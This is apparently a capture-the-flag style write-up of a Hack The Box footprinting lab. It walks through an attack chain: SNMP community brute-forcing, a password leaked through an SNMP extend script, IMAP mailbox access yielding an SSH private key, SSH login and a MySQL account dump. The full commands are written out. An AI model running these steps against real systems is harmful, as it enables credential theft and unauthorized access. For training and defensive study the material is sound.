## Footprinting Skills Assessment — Hard (MX / management / backup server)

Goal: find user **HTB** and its password. Host `NIXHARD`.

## Attack chain
1. **Port scan** → 22 SSH, 110/143/993/995 (Dovecot POP3/IMAP). No SMTP/web exposed.
2. **SNMP** — `public` times out; `onesixtyone` finds the real community string **`backup`**.
3. **SNMP walk `-c backup`** → a NET-SNMP **extend** runs `/opt/tom-recovery.sh` and the OID tree leaks its args: **`tom <tom-pass>`** (the script is just `echo $1:$2 | chpasswd`). That's tom's mail password.
4. SSH = **publickey only** (password auth disabled), so the mail password is used on **IMAP** instead → tom's **INBOX** contains his **SSH private key** (comment `tom@NIXHARD`).
5. **SSH in with the key** → tom is in the **`mysql`** group. `.bash_history` shows `mysql -u tom -p` and `use users`.
6. **MySQL** with tom's password → `users.users` table holds all accounts incl. **HTB** (row 150).

## Commands I actually ran
```bash
# 1. ports
nmap -Pn -p- --min-rate 2000 <TARGET>
nmap -Pn -sV -p22,110,143,993,995 <TARGET>

# 2. SNMP community brute -> "backup"
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET>

# 3. walk with it; the extend script args leak tom's password
snmpwalk -v2c -c backup <TARGET> | grep 25.1.7      # -> /opt/tom-recovery.sh  "tom <tom-pass>"

# 4. SSH wants a key; use tom's pass on IMAP to read his mailbox
printf '1 LOGIN tom <tom-pass>\r\n2 LIST "" *\r\n3 LOGOUT\r\n' \
  | openssl s_client -connect <TARGET>:imaps -quiet
# fetch INBOX msg 1 -> OpenSSH private key; strip CRs and save:
#   ... FETCH 1 BODY[]  | sed -n '/BEGIN OPENSSH/,/END OPENSSH/p' | tr -d '\r' > tom_key
chmod 600 tom_key

# 5. SSH as tom with the key
ssh -i tom_key -o IdentitiesOnly=yes tom@<TARGET>
#   id -> groups: tom, mysql ; ~/.bash_history -> mysql -u tom -p ; use users

# 6. dump the accounts DB
mysql -u tom -p<tom-pass> -e "use users; select * from users;"   # -> HTB row
```

## Notes to self
- `public` failing doesn't mean no SNMP — **brute the community string** (`onesixtyone`); here it was `backup`.
- NET-SNMP **extend** scripts expose their **command line (args) in the OID tree** (`.1.3.6.1.2.1.25.1.7...`) — creds passed as args leak. The OID index `6.66.65.67.75.85.80` = ASCII "BACKUP" (the extend name).
- When **SSH is publickey-only**, a leaked password still works on **other services** (IMAP/POP3 here) — mailboxes often store keys/secrets.
- IMAP bodies have **CRLF**; `tr -d '\r'` before using an extracted SSH key or `ssh-keygen -y` fails.
- Group membership matters: tom ∈ `mysql` + `.bash_history`/`.mysql_history` pointed straight at the `users` DB.
- Same password (`<tom-pass>`) reused for mail AND MySQL — password reuse again.
